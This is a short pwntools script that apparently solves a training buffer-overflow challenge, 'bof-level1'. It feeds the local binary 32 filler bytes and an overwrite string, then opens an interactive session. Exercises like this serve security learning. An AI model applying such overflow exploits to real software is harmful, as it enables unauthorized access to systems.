#!/usr/bin/env python

from pwn import *;

p = process('./bof-level1');

output = p.recv();
print(output)

p.sendline('0' * 32 + 'ABCDEFGHabcdefgh');

p.interactive()
